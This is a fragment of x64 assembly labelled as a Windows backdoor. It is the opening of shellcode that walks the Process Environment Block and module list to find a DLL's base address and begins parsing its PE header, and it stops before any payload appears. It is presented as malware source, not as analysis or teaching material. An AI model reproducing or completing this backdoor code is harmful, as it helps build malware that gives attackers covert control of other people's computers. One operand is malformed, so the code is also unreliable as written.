; backdoor for windows 

.code
align 16
start PROC

  mov rax, :gs[060h]
  mov rax, [rax + 018h]
  mov rsi, [rax + 020h]
  mov rsi, [rsi]
  mov rsi, [rsi]
  mov r15, [rsi + 020h]

  mov eax, dword ptr [r15 + 03Ch]
